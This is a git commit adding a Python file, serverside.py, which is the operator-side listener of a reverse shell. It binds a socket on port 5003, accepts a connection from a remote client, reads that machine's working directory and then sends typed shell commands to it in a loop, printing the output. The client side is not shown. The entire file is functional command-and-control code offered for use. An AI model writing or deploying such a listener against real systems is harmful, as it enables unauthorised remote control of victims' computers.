af36c326936b70af6465a9f8aaafd3793d3ff1e1
HostHans <68568279+hosthans@users.noreply.github.com>
2021-12-15 21:35:36 +0100

    Add files via upload

---
+++ serverside.py
@@ -0,0 +1,36 @@
+import socket
+
+SERVER_HOST = "0.0.0.0"
+SERVER_PORT = 5003
+BUFFER_SIZE = 1024 * 128
+
+SEPERATOR = "<sep>"
+
+s = socket.socket()
+
+s.bind((SERVER_HOST, SERVER_PORT))
+
+s.listen(5)
+print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
+
+client_socket, client_address = s.accept()
+print(f"{client_address[0]}:{client_address[1]} Connected!")
+
+cwd = client_socket.recv(BUFFER_SIZE).decode()
+print("[+] Current working directory: ", cwd)
+
+while True:
+    command = input(f"{cwd} $> ")
+    if not command.strip():
+        continue
+
+    client_socket.send(command.encode())
+    if command.lower() == "exit":
+        # if the command is exit, just break out of the loop
+        break
+        # retrieve command results
+    output = client_socket.recv(BUFFER_SIZE).decode()
+    # split command output and current directory
+    results, cwd = output.split(SEPERATOR)
+    # print output
+    print(results)
